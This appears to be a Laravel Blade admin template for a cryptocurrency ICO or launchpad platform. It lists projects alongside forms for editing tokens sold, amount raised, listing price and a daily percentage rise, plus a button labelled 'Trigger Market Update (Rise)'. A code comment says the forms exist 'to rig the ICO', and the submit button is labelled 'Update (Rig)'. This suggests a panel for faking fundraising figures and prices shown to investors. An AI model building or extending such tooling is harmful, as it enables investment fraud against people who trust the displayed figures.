@extends('layouts.admin.app')
@section('title', 'Launchpad Projects')

@section('content')
<div class="row">
    <div class="col-12">
        <div class="card">
            <div class="card-header d-flex justify-content-between align-items-center">
                <h4>ICO / Launchpad Projects</h4>
                <form action="{{ route('admin.launchpad.projects.sync_binance') }}" method="POST" class="d-inline">
                    @csrf
                    <button type="submit" class="btn btn-info">Auto-Populate from Binance</button>
                </form>
                <form action="{{ route('admin.launchpad.projects.market_update') }}" method="POST" class="d-inline ml-2">
                    @csrf
                    <button type="submit" class="btn btn-success">Trigger Market Update (Rise)</button>
                </form>
            </div>
            <div class="card-body">
                <table class="table table-striped">
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Name</th>
                            <th>Symbol</th>
                            <th>Total Supply</th>
                            <th>Raised / Sold</th>
                            <th>Status</th>
                            <th>Increase (%)</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        @foreach($projects as $project)
                        <tr>
                            <td>{{ $project->id }}</td>
                            <td>{{ $project->name }}</td>
                            <td>{{ $project->symbol }}</td>
                            <td>{{ $project->total_supply }}</td>
                            <td>{{ $project->raised_amount }} / {{ $project->tokens_sold }}</td>
                            <td>{{ $project->status }}</td>
                            <td>{{ $project->daily_increase_percentage }}%</td>
                            <td>
                                <!-- Add simple forms to update tokens sold or raised amount to rig the ICO -->
                                <form action="{{ route('admin.launchpad.projects.update', $project->id) }}" method="POST">
                                    @csrf
                                    <input type="text" name="tokens_sold" value="{{ $project->tokens_sold }}" placeholder="Tokens Sold" class="form-control mb-1">
                                    <input type="text" name="raised_amount" value="{{ $project->raised_amount }}" placeholder="Raised Amt" class="form-control mb-1">
                                    <input type="text" name="listing_price" value="{{ $project->listing_price }}" placeholder="Listing Price" class="form-control mb-1">
                                    <input type="text" name="daily_increase_percentage" value="{{ $project->daily_increase_percentage }}" placeholder="Daily %" class="form-control mb-1">
                                    <button class="btn btn-sm btn-primary" type="submit">Update (Rig)</button>
                                </form>
                            </td>
                        </tr>
                        @endforeach
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</div>
@endsection
